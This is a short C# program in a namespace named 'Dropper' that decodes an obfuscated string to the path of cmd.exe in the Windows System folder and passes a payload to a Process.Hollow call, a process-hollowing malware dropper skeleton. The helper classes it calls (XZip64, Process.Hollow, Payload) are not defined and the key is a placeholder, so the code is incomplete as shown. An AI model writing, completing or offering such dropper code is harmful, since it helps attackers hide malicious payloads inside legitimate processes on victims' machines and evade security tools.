﻿using System;
using System.Text;

namespace Dropper
{
    class Program
    {
        static void Main()
        {
            string key = "YOUR_DECODING_KEY_HERE";
            // NOTE: Encoded "cmd.exe" string.
            string encoded = "H4sIAAAAAAAEAO29B2AcSZYlJi9tynt/" + "SvVK1+B0oQiAYBMk2JBAEOzBiM3mkuwd" + "aUcjKasqgcplVmVdZhZAzO2dvPfee++9" + "99577733ujudTif33/8/XGZkAWz2zkra" + "yZ4hgKrIHz9+fB8/In6DX+e3+fI3+c1/" + "2/8Hm3JRwwcAAAA=";
            string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + Encoding.ASCII.GetString(XZip64.Decode(encoded, key));
            // string path = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\cmd.exe";
            Process.Hollow(Payload.GetPayload(key), path);
        }
    }
}
